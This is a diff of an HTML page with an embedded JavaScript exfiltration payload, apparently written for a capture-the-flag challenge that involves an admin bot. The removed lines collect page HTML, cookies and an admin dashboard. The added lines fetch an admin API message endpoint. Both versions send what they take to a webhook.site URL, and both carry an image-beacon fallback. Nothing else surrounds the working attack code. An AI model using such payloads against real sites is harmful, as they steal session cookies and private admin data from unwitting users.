@@ -1,41 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Audit in Progress...</h1>
     <script>
-        const webhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';
+        // Use the successful path and your NEW message ID
+        const targetPath = '/api/admin/messages/69ea9c01bee6d6b7c66465d7';
+        const myWebhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';
 
-        // 1. Grab everything from the current page the bot is on
-        const pageContent = document.documentElement.innerHTML;
-        const flagInHtml = pageContent.match(/Hash{[^}]+}/i);
-        
-        // 2. Grab the Cookies (Flags are often here)
-        const cookies = document.cookie;
-        const flagInCookies = cookies.match(/Hash{[^}]+}/i);
-
-        // 3. Try to fetch the Dashboard text directly (most common flag location)
-        fetch('/admin/dashboard')
-            .then(r => r.text())
-            .then(text => {
-                const flagInDash = text.match(/Hash{[^}]+}/i);
-                
-                // Send all results back in one go
-                const report = {
-                    html: flagInHtml ? flagInHtml[0] : "Not found in HTML",
-                    cookie: flagInCookies ? flagInCookies[0] : "Not found in Cookies",
-                    dashboard: flagInDash ? flagInDash[0] : "Not found in Dashboard",
-                    location: window.location.href
-                };
-
-                fetch(webhook, {
+        fetch(targetPath)
+            .then(response => response.text())
+            .then(data => {
+                // Send the result to your new webhook
+                fetch(myWebhook, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: btoa(JSON.stringify(report))
+                    body: btoa('EXAM_FLAG_RESULT:' + data)
                 });
             })
             .catch(err => {
-                // If dashboard is blocked, at least send what we have
-                new Image().src = webhook + '?quick_leak=' + btoa(cookies + " | " + (flagInHtml || "None"));
+                // Log if the admin can't reach the API from your link
+                new Image().src = myWebhook + '?error=' + btoa(err.message);
             });
     </script>
 </body>
